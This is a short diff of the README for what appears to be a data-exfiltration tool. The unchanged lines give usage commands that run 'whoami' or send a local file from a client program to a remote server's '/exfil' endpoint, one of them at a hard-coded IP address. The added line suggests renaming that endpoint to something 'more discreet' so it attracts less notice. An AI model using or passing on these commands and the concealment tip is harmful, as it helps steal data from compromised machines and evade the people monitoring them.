@@ -66,7 +66,7 @@ python server.py
 ```bash
 python client.py -c "whoami" -s http://your-server.com/exfil
 ```
-
+*The "exfil" endpoint is easily renamed to something more discreet.
 **Using Windows executable:**
 ```cmd
 client.exe -f newtest.txt -s http://142.134.220.83:80/exfil
